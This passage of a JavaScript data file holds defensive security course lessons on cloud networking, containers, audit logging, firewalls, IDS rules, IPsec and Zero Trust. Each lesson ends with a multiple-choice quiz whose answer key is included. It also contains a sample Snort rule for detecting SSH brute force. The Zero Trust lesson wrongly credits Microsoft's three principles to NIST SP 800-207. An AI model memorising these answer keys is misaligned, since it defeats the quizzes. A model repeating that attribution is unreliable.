    },
    {
      title: 'VPC Segmentation & Security Groups',
      duration: '8 min',
      body: [
        'A Virtual Private Cloud (VPC) provides an isolated virtual network dedicated to a cloud account. Within a VPC, subnets divide address space into Public Subnets (connected to an Internet Gateway, housing load balancers and reverse proxies) and Private Subnets (lacking direct internet routes, housing application servers and database clusters).',
        'Traffic filtering operates at two distinct layers: Security Groups (stateful virtual firewalls attached to individual network interfaces/instances, where returning traffic is automatically allowed) and Network Access Control Lists (NACLs: stateless subnet-level firewalls evaluated sequentially by rule number).',
        'Private instances communicate with external APIs (for OS updates) via NAT Gateways located in public subnets, ensuring instances can initiate outbound requests without accepting any unsolicited inbound connections from the Internet.'
      ],
      takeaway: 'Isolate sensitive databases in private subnets; use stateful Security Groups to restrict traffic to explicitly authorized ports and source groups.',
      question: 'What is the primary difference in state handling between cloud Security Groups and Network ACLs (NACLs)?',
      options: [
        'Security Groups are stateful (return traffic is automatically allowed); Network ACLs are stateless (inbound and outbound rules must be specified)',
        'Security Groups only filter UDP; NACLs only filter TCP',
        'Security Groups operate on physical switches; NACLs operate in software',
        'Security Groups require physical keycards to change'
      ],
      answer: 0,
      explanation: 'Security Groups are stateful: if an inbound request is permitted, the corresponding response is automatically allowed outbound regardless of outbound rules. NACLs are stateless and require explicit rules for both directions.'
    },
    {
      title: 'Container & Kubernetes Security Basics',
      duration: '9 min',
      body: [
        'Containers package applications and their dependencies into lightweight, standalone executable images. Containers share the host operating system kernel, utilizing Linux Namespaces (isolating PID, network, mount, IPC) and Cgroups (enforcing memory, CPU, and I/O resource limits).',
        'Container security begins with image provenance: using minimal, hardened base images (e.g., Alpine or Distroless), scanning images for known vulnerabilities in CI/CD pipelines (using Trivy or Clair), and enforcing non-root user execution (`USER 10001` in Dockerfile) to prevent container breakouts from gaining root privileges on the host kernel.',
        'In Kubernetes (K8s), container orchestration security requires implementing Pod Security Standards (blocking privileged containers and host filesystem mounts), enforcing Kubernetes Network Policies (restricting pod-to-pod east-west communication), and configuring Role-Based Access Control (RBAC) on the Kubernetes API server.'
      ],
      takeaway: 'Never run containers as root; scan images with Trivy, use Distroless bases, and enforce Kubernetes Pod Security Standards.',
      question: 'Why should container images (Dockerfiles) always specify a non-root user directive (`USER 10001`) instead of running as default UID 0?',
      options: [
        'If a container breakout vulnerability occurs, the attacker lands on the host kernel as an unprivileged user rather than root',
        'Root containers cannot connect to the internet',
        'Running as root causes container images to be 10 times larger',
        'Linux kernels reject root containers automatically'
      ],
      answer: 0,
      explanation: 'If a vulnerability allows an attacker to break out of a container running as root (UID 0), they gain immediate root privileges over the entire underlying host node.'
    },
    {
      title: 'Cloud Audit Logging with CloudTrail & CloudWatch',
      duration: '8 min',
      body: [
        'Visibility in cloud environments requires comprehensive, tamper-evident audit logging. In AWS, CloudTrail records every API call made across the account—whether issued via the AWS Management Console, CLI, SDKs, or cloud services.',
        'CloudTrail events capture: the identity of the caller (`userIdentity`, including IAM user or assumed role ARN), the event timestamp in UTC, the calling IP address, the user-agent, the API action (e.g., `s3:PutBucketPolicy`, `ec2:RunInstances`), and request parameters.',
        'Securing the audit trail itself is paramount: CloudTrail logs should be forwarded to a centralized, dedicated security account with S3 Object Lock (WORM - Write Once, Read Many) enabled and Multi-Factor Authentication Delete (MFA Delete) activated. This prevents an attacker who compromises an account from deleting the forensic log trail to conceal their intrusion.'
      ],
      takeaway: 'Centralize CloudTrail logs in a dedicated security account with S3 Object Lock (WORM) to prevent attackers from deleting audit evidence.',
      question: 'Which AWS service logs every management event and API request made across an account, providing the primary forensic audit trail for cloud investigations?',
      options: [
        'AWS CloudTrail',
        'Amazon Route 53',
        'AWS Elastic Beanstalk',
        'Amazon DynamoDB'
      ],
      answer: 0,
      explanation: 'AWS CloudTrail captures all management and data API calls made within an AWS account, recording who performed the action, from what IP, and at what exact time.'
    }
  ],

  'course-net-sec': [
    {
      title: 'Stateful Firewalls & ACL Rule Design',
      duration: '8 min',
      body: [
        'Firewalls are the foundational network perimeter control. Packet-filtering firewalls inspect headers statelessly against Access Control Lists (ACLs). Stateful firewalls advance this by maintaining a Dynamic State Table that tracks active TCP handshakes and UDP pseudo-connections.',
        'In a stateful firewall, when an internal user connects to an external web server on port 443, the firewall records the connection (Source IP:Port, Destination IP:Port, Protocol, State). When the external web server replies, the firewall recognizes the return packet in its state table and permits it automatically, without requiring a dangerous open inbound rule for the entire Internet.',
        'ACL rule design requires a "Default Deny" posture: explicitly permit authorized business traffic first, terminating with an implicit `DENY ANY ANY` rule at the bottom. Rules must be ordered by traffic frequency and specificity to optimize throughput and avoid rule shadowing.'
      ],
      takeaway: 'Stateful firewalls maintain connection tables to permit return traffic automatically; always terminate ACLs with an explicit Default Deny rule.',
      question: 'What is the primary benefit of a stateful firewall over an older stateless packet filter?',
      options: [
        'It tracks connection states, permitting legitimate return traffic automatically without opening broad inbound ports',
        'It increases the internet connection bandwidth by 50%',
        'It eliminates the need for software updates',
        'It automatically cracks passwords on encrypted packets'
      ],
      answer: 0,
      explanation: 'Stateful inspection maintains a connection table, automatically validating that incoming packets are legitimate responses to previously established outbound sessions.'
    },
    {
      title: 'Next-Gen Firewalls & Deep Packet Inspection',
      duration: '9 min',
      body: [
        'Traditional firewalls operate at Layers 3 and 4 (IP addresses and port numbers). Modern threat actors easily bypass Layer 4 controls by running malicious tools, command-and-control (C2) protocols, or file exfiltration over standard open ports like TCP 80, 443, or 53.',
        'Next-Generation Firewalls (NGFWs, such as Palo Alto Networks, Fortinet, Check Point) integrate Deep Packet Inspection (DPI) operating at Layer 7. An NGFW inspects the actual application payload regardless of port, distinguishing benign web browsing from BitTorrent, unauthorized SSH over port 443, or DNS tunneling on port 53.',
        'NGFWs incorporate SSL/TLS Decryption (TLS Inspection / MITM proxying) using corporate certificates installed on managed endpoints. By decrypting, inspecting, and re-encrypting traffic at line rate, the firewall inspects encrypted HTTPS payloads for malware downloads, data loss prevention (DLP) violations, and zero-day exploits.'
      ],
      takeaway: 'NGFWs perform Layer 7 Deep Packet Inspection and TLS decryption to detect malware and C2 channels hidden inside legitimate HTTPS traffic.',
      question: 'Why is TLS/SSL Decryption inspection necessary on Next-Generation Firewalls (NGFWs) in modern corporate networks?',
      options: [
        'Over 90% of web traffic is encrypted, blinding firewalls to malware downloads and C2 traffic unless decrypted and inspected',
        'Because unencrypted web traffic is faster to route',
        'To allow firewalls to mine cryptocurrency in idle cycles',
        'Because routers cannot forward encrypted packets'
      ],
      answer: 0,
      explanation: 'Because modern web traffic is encrypted with HTTPS/TLS, an NGFW cannot inspect payloads for malware or exfiltration without intercepting and decrypting the stream.'
    },
    {
      title: 'Snort & Suricata Rule Syntax',
      duration: '8 min',
      body: [
        'Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) monitor network traffic for signatures of known exploits, protocol violations, and malware communication. Snort and Suricata are the standard open-source rule engines powering enterprise network sensors.',
        'A Snort/Suricata rule consists of a Rule Header (Action, Protocol, Source IP/Port, Direction, Destination IP/Port) and Rule Options (enclosed in parentheses): `alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"ET SCAN Potential SSH Brute Force"; flags:S; threshold:type threshold, track by_src, count 10, seconds 60; classtype:attempted-admin; sid:2001234; rev:1;)`.',
        'Suricata improves on legacy Snort with high-throughput multi-threading, native file extraction, and dedicated Layer 7 protocol parsers (HTTP, TLS, DNS). Writing effective rules requires precise content matching (using `content:"..."`, `pcre:"..."`, and `distance`) to avoid false positives and high CPU load.'
      ],
      takeaway: 'Snort and Suricata rules define signature matches (headers, payload content, thresholds) to detect and block malicious network traffic.',
      question: 'In a Snort or Suricata rule, what does the `sid` field in the rule options specify?',
      options: [
        'Snort Identifier (a unique numerical ID assigned to the specific rule signature)',
        'Server Internet Domain',
        'System Interrupt Delay',
        'Session Initialization Data'
      ],
      answer: 0,
      explanation: 'The `sid` (Snort ID) is a unique integer identifier assigned to each rule, with values above 1,000,000 reserved for custom local rules.'
    },
    {
      title: 'IPsec VPNs & Site-to-Site Encrypted Tunnels',
      duration: '8 min',
      body: [
        'Internet Protocol Security (IPsec) is a suite of cryptographic protocols that authenticate and encrypt IP packets at Layer 3, enabling secure Site-to-Site and Remote Access Virtual Private Networks (VPNs).',
        'IPsec comprises two core protocols: Authentication Header (AH, providing integrity and origin authentication without confidentiality) and Encapsulating Security Payload (ESP, providing confidentiality through encryption, integrity, and anti-replay protection). In Tunnel Mode, the entire original IP packet is encrypted and wrapped with a new outer IP header, ideal for connecting branch offices across the public Internet.',
        'Tunnel negotiation uses Internet Key Exchange (IKEv2): Phase 1 negotiates an authenticated IKE Security Association (IKE SA) using Diffie-Hellman. Phase 2 negotiates the Child SA (IPsec SA) defining the symmetric encryption algorithm (AES-256-GCM) used to protect actual data transit.'
      ],
      takeaway: 'IPsec Tunnel Mode with ESP encrypts entire IP packets, creating secure site-to-site cryptographic tunnels across the public Internet.',
      question: 'Which IPsec protocol provides both data encryption (confidentiality) and cryptographic integrity/authentication for transit packets?',
      options: [
        'ESP (Encapsulating Security Payload)',
        'AH (Authentication Header)',
        'ICMP (Internet Control Message Protocol)',
        'RIP (Routing Information Protocol)'
      ],
      answer: 0,
      explanation: 'ESP (Encapsulating Security Payload) provides encryption, origin authentication, data integrity, and anti-replay services. AH provides only authentication and integrity without encryption.'
    },
    {
      title: 'Micro-segmentation Strategies',
      duration: '8 min',
      body: [
        'Traditional network security relied on a "castle-and-moat" perimeter: strong defenses at the external edge, but an open, flat network internally. Once an attacker breached the perimeter (e.g., via a compromised laptop), they could freely scan and pivot across the internal network (East-West traffic).',
        'Micro-segmentation divides data centers, cloud environments, and enterprise networks into fine-grained, isolated security zones down to individual workloads. By implementing software-defined network (SDN) firewalls and host-based firewalls, communications between servers in the same subnet are restricted.',
        'For example, a web tier server is permitted to communicate ONLY with the specific database port (e.g., TCP 5432) on the designated database server. All other lateral traffic—such as SSH, RDP, or SMB between web servers—is blocked. If an attacker compromises one web server, micro-segmentation prevents lateral movement across the fleet.'
      ],
      takeaway: 'Micro-segmentation restricts East-West lateral traffic between workloads, containing breaches within isolated micro-perimeters.',
      question: 'What network security strategy prevents an attacker who compromised a web server from pivoting laterally to other internal servers in the same datacenter?',
      options: [
        'Micro-segmentation',
        'Dynamic DNS updates',
        'Default Gateway routing',
        'Wi-Fi WPS pairing'
      ],
      answer: 0,
      explanation: 'Micro-segmentation establishes strict security policies between individual internal workloads, preventing unauthorized east-west lateral movement even within the same subnet.'
    },
    {
      title: 'Zero Trust Architecture Principles',
      duration: '8 min',
      body: [
        'Zero Trust is a strategic cybersecurity paradigm rooted in a simple maxim: "Never trust, always verify." Under Zero Trust, no user, device, or application is granted implicit trust simply because it resides inside the internal corporate network or connected via a VPN.',
        'NIST Special Publication 800-207 outlines the three core principles of Zero Trust Architecture: 1. Verify Explicitly (always authenticate and authorize using all available data points, including user identity, device health, location, and data classification); 2. Use Least Privilege (limit user access with Just-In-Time and Just-Enough-Access controls); 3. Assume Breach (minimize blast radius, segment access, and encrypt all sessions end-to-end).',
        'Zero Trust replaces legacy full-network VPNs with Identity-Aware Proxies (IAPs, such as Google BeyondCorp, Zscaler, or Cloudflare Access). Users authenticate per-application based on continuous risk assessment, ensuring compromised credentials on an unmanaged laptop cannot access internal databases.'
      ],
      takeaway: 'Zero Trust rejects implicit trust based on network location; it enforces explicit verification, least privilege, and assumes breach on every request.',
      question: 'Which core tenet of NIST SP 800-207 Zero Trust Architecture mandates that authentication and authorization occur continuously for every resource request regardless of network location?',
      options: [
        'Verify Explicitly',
        'Default Allow Internal',
        'Trust on First Use (TOFU)',
        'Perimeter Castle-and-Moat'
      ],
      answer: 0,
      explanation: '"Verify Explicitly" requires continuous authentication and authorization across all available signals (identity, device posture, location) before granting access to any resource, eliminating implicit network trust.'
    }
  ]
}
